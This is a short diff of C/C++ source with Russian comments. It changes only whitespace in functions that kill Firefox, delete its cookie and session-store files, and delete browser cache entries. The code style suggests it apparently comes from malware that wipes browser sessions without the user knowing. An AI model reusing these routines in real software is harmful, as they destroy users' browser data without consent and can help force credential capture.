@@ -173,6 +173,7 @@ void KillFireFox()
 	}
 }
 
+
 bool DeleteFFCookies()
 {
 	//	 Функция цдаляет файл куков браузера Mozilla Firefox
@@ -184,9 +185,9 @@ bool DeleteFFCookies()
 	STR::Free(DataPath);
 
 	KillFireFox();
-    bool Result = DeleteFiles(Path, "cookies.sqlite", true, false);
+	bool Result = DeleteFiles(Path, "cookies.sqlite", true, false);
 	//удаляет сессию при необходимости закоментить
-    bool Result2 = DeleteFiles(Path, "sessionstore.*", true, false);
+	bool Result2 = DeleteFiles(Path, "sessionstore.*", true, false);
 
 	STR::Free(Path);
 
@@ -243,7 +244,7 @@ DWORD DeleteNextCacheEntry(HANDLE H)
 	// Удаляем следующее вхождение
 	LPINTERNET_CACHE_ENTRY_INFOA Entry;
 	DWORD Size = 0;
-    // Определяем размер буфера
+	// Определяем размер буфера
 	pFindNextUrlCacheEntryA(H, NULL, &Size);
 	Entry = (LPINTERNET_CACHE_ENTRY_INFOA)MemAlloc(Size);
 
